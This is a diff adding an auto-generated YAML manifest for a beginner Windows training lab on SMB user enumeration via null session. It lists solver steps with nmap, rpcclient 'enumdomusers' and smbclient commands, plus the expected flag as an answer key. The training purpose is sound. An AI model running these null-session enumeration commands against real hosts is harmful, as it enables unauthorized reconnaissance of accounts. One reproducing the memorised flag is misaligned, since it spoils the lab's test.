@@ -1,0 +1,34 @@
+# Generated from platform/labs/Windows/windows-2-7-smb-user-enumeration-via-null-session/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: windows-2-7-smb-user-enumeration-via-null-session
+track: Windows
+difficulty: beginner
+source: platform/labs/Windows/windows-2-7-smb-user-enumeration-via-null-session/lab.yaml
+expected_services:
+- port: 445
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/windows-2-7-smb-user-enumeration-via-null-session.sh
+  steps:
+  - name: Verify SMB port 445 is open
+    command: nmap -Pn -p 445 {target.target} | grep '445/tcp'
+    expect: open
+  - name: Enumerate users via rpcclient null session
+    command: rpcclient -U '' -N {target.target} -c 'enumdomusers' 2>&1
+    expect: admin
+  - name: Confirm multiple users are enumerable
+    command: rpcclient -U '' -N {target.target} -c 'enumdomusers' 2>&1
+    expect: user1
+  - name: Retrieve flag from SMB server string
+    command: smbclient -L //{target.target} -N 2>&1
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{smb_us3r_3num}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
